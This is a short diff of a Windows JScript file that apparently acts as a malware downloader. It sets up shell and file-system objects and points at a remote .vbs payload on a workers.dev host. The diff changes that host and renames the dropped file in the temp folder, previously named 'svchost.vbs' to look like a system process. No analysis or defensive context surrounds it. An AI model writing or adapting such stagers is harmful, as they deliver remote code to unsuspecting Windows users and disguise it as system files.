@@ -1,8 +1,8 @@
 var shell = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 
-var url = "https://broad-waterfall-4c53.aledreamer1234.workers.dev/555.vbs";
-var path = fso.GetSpecialFolder(2) + "\\svchost.vbs";
+var url = "https://crimson-shadow-5337.aledreamer1234.workers.dev/555.vbs";
+var path = fso.GetSpecialFolder(2) + "\\thetruth.vbs";
 
 var log = fso.CreateTextFile(fso.GetSpecialFolder(2) + "\\js_test.log", true);
 log.WriteLine("JS started: " + new Date());
